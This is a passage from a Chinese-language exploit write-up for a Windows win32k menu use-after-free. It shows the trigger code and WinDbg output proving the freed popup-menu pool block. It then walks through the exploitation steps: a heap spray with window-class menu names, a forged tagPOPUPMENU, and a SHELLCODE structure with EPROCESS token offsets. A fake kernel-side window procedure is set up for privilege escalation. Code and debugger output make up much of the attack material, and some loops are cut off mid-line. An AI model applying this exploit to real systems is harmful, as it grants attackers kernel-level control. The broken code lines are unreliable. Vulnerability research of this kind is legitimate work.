    )
    {
        switch (msg)
        {
        case 0x1E5:
            return (LRESULT)MF_POPUP;
        case 0x1F0:
            return (LRESULT)0;
        }
        return DefWindowProc(hwnd, msg, wParam, lParam);
    }
_验证代码自定义的利用菜单窗口对象消息处理函数_
在调用对象指定的消息处理函数以投递 `MN_SETTIMERTOOPENHIERARCHY` 消息之前，函数 `xxxSendMessageTimeout`
还调用 `xxxCallHook` 函数分发挂钩处理程序。在自定义的挂钩处理程序函数 `xxWindowHookProc` 中，增加对成员域
`message` 数值的判断：
当 `message` 数值为 `0x1F0` 时，验证代码调用 `DestroyWindow` 触发销毁先前创建用来利用的 `hwndFakeMenu`
菜单窗口对象。
    if (cwp->message == 0x1F0)
    {
        DestroyWindow(hwndFakeMenu);
    }
_自定义挂钩处理程序函数增加 message 判断处理逻辑_
此时在内核中将对目标菜单窗口对象调用 `xxxDestroyWindow` 函数。在该函数执行期间，由于成员域 `fDelayFree`
未被置位，目标菜单窗口对象所关联的弹出菜单 `tagPOPUPMENU`
对象将被立刻销毁，扩展区域指向弹出菜单对象的指针将被置空。而由于锁计数尚未归零，因此目标菜单窗口对象将仍旧存留与内核中，暂时不会被释放。
当执行流回到函数 `xxxMNMouseMove` 中时，目标弹出菜单对象已被销毁并释放，但寄存器 `edx`
仍旧存储被释放弹出菜单对象的地址，在没有对该地址进行有效性判断的前提下，函数直接调用 `xxxMNHideNextHierarchy`
函数，导致释放后重用漏洞的触发。
* * *
**释放后重用的触发**
在函数 `xxxMNMouseMove` 中调用 `xxxSendMessage` 发送 `MN_SETTIMERTOOPENHIERARCHY`
消息的下一条指令位置下断点，并在测试环境中执行编译后的验证代码程序。命中断点后观测数据，可发现目标菜单窗口对象的扩展区域原本指向关联的弹出菜单对象的指针已被置空；而存储在寄存器
`ebx` 中的目标弹出菜单对象的内存块已处于 Free 状态：
    win32k!xxxMNMouseMove+0x14e:
    9481953d 85c0            test    eax,eax
    kd> r esi
    esi=fe810050
    kd> ?poi(esi+b0)
    Evaluate expression: 0 = 00000000
    kd> r ebx
    ebx=ffb6e328
    kd> !pool ffb6e328
    Pool page ffb6e328 region is Paged session pool
     ffb6e000 size:  260 previous size:    0  (Allocated)  Gla5
     ffb6e260 size:   10 previous size:  260  (Allocated)  Glnk
     ffb6e270 size:   10 previous size:   10  (Allocated)  Glnk
     ffb6e280 size:   a0 previous size:   10  (Allocated)  Gla8
    *ffb6e320 size:   40 previous size:   a0  (Free ) *Uspm Process: 85bc5338
             Pooltag Uspm : USERTAG_POPUPMENU, Binary : win32k!MNAllocPopup
     [...]
_目标弹出菜单对象的内存块已处于 Free 状态_
接下来执行流进入 `xxxMNHideNextHierarchy` 函数调用并将目标弹出菜单对象地址作为参数传入，在该函数中向成员域
`spwndNextPopup`
指向的子菜单窗口对象发送消息。由于已被释放内存的目标弹出菜单对象的各个成员域已被置空，因此该函数在判断后将直接返回，不会导致系统 BSOD 的发生。
#### 0x4 利用
前面通过编写验证代码实现了对释放后重用漏洞的触发。在验证代码自定义的窗口挂钩处理程序中，通过调用 `DestroyWindow`
函数触发销毁用于利用的菜单窗口对象，这将导致系统在内核中直接释放目标菜单窗口对象所关联的弹出菜单 `tagPOPUPMENU`
对象，而在内核中该对象的指针仍旧存储在寄存器 `ebx` 中。
在函数 `xxxSendMessage` 返回后，函数 `xxxMNMouseMove`
并没有从目标菜单窗口对象的扩展区域重新获取该指针，也没有对寄存器中存储的地址进行验证，就直接将该地址作为参数传入函数
`xxxMNHideNextHierarchy` 中。在函数 `xxxMNHideNextHierarchy` 中对参数指向的目标弹出菜单对象的成员域
`spwndNextPopup` 进行访问，此时该地址的内存区域处于被释放（Free）状态，这就导致了释放后重用的发生。
* * *
**内存区域的重新占用**
接下来通过在已被释放的弹出菜单对象的内存区域重新分配新的内存块并构造其中的数据，实现对该漏洞的利用和内核提权。与之前分析 CVE-2017-0263
时类似地，在利用代码中使用批量创建普通窗口对象并设置窗口类菜单名称的方式来实现。
_利用代码批量设置窗口类菜单名称以占用被释放的菜单窗口对象_
在利用代码中注册 256 个随机类名称的窗口类以避免重复，并通过每个窗口类创建一个普通窗口对象。
    for (INT i = 0; i flags
    dwPopupFake[0x1] = (DWORD)0xdddddddd;  //->spwndNotify
    dwPopupFake[0x2] = (DWORD)0xdddddddd;  //->spwndPopupMenu
    dwPopupFake[0x3] = (DWORD)0xdddddddd;  //->spwndNextPopup
    dwPopupFake[0x4] = (DWORD)0xdddddddd;  //->spwndPrevPopup
    dwPopupFake[0x5] = (DWORD)0xdddddddd;  //->spmenu
    dwPopupFake[0x6] = (DWORD)0xdddddddd;  //->spmenuAlternate
    dwPopupFake[0x7] = (DWORD)0xdddddddd;  //->spwndActivePopup
    dwPopupFake[0x8] = (DWORD)0xdddddddd;  //->ppopupmenuRoot
    dwPopupFake[0x9] = (DWORD)0xdddddddd;  //->ppmDelayedFree
    dwPopupFake[0xA] = (DWORD)0xdddddddd;  //->posSelectedItem
    dwPopupFake[0xB] = (DWORD)0xdddddddd;  //->posDropped
    dwPopupFake[0xC] = (DWORD)0;
    for (UINT i = 0; i  dc ebx
    fd602df0  dddddddd dddddddd dddddddd dddddddd  ................
    fd602e00  dddddddd dddddddd dddddddd dddddddd  ................
    fd602e10  dddddddd dddddddd dddddddd dddddddd  ................
    fd602e20  00000000 85dde030 00070008 69707355  ....0.......Uspi
    fd602e30  ff4e22c8 92662f70 0084d032 00000000  ."N.p/f.2.......
    fd602e40  0023a8e4 00000000 00020910 000c0fc0  ..#.............
    fd602e50  00000460 00000000 00000004 00000000  `...............
    fd602e60  46340007 64667454 8779d438 87c5d970  ..4FTtfd8.y.p...
_占用原位置的弹出菜单对象各个成员域的数据_
* * *
**内核利用的准备工作**
在利用代码的早期阶段定义结构体 `SHELLCODE` 以存储当前进程的 PID 以及关键内核对象成员域的偏移值和内核利用成功反馈变量，并存储
ShellCode 代码的入口点。
    typedef struct _SHELLCODE {
        DWORD reserved;
        DWORD pid;
        DWORD off_THREADINFO_ppi;
        DWORD off_EPROCESS_ActiveLink;
        DWORD off_EPROCESS_Token;
        BOOL  bExploited;
        BYTE  pfnWindProc[];
    } SHELLCODE, *PSHELLCODE;
_利用代码定义的 SHELLCODE 结构体_
在用户进程中分配 `0x1000` 字节大小的 `RWX` 内存块用来作为结构体 `SHELLCODE`
的对象实例，初始化对象的各个成员域，将内核利用函数的代码完整拷贝到以成员域 `pfnWindProc` 地址作为起始的 ShellCode 代码内存区域。
接下来在分配的内存块后段划分出 `0xb0` 字节大小的区域用作伪造的子菜单窗口 `tagWND` 对象，使其成员标志位
`bServerSideWindowProc` 置位（决定消息处理函数在内核上下文直接执行），并将消息处理函数成员域 `lpfnWndProc` 修改为